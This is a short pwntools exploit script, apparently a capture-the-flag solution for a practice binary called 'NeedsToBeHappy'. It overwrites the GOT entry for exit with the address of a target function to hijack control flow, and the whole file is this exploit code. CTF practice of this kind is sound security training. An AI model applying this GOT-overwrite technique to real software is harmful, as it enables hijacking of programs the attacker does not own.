from pwn import *  

context.binary = "../NeedsToBeHappy"
e: ELF = context.binary 
p = process()
p.sendline(b"y")
p.sendline(str(e.functions["give_the_man_a_cat"].address).encode("ascii"))
p.sendline(str(e.got["exit"]).encode("ascii"))
p.interactive()